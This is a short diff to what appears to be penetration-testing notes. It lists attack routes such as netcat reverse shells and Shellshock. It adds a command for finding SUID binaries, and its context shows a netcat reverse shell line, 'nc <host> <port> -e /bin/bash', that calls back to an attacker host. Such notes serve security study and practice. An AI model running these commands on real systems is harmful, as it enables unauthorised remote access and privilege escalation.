@@ -7,6 +7,10 @@
 2. netcat reverse shell _(see below)_
 3. Bash shellshock, in cgi and sometimes [ssh](https://resources.infosecinstitute.com/bash-bug-cve-2014-6271-critical-vulnerability-scaring-internet/)
 
+* list binaries with SUID bit set:
+
+      find / -perm -u=s -type f 2>/dev/null
+
 #### Netcat reverse shell
 On the target machine shell : `nc <host> <any port> -e /bin/bash`
 
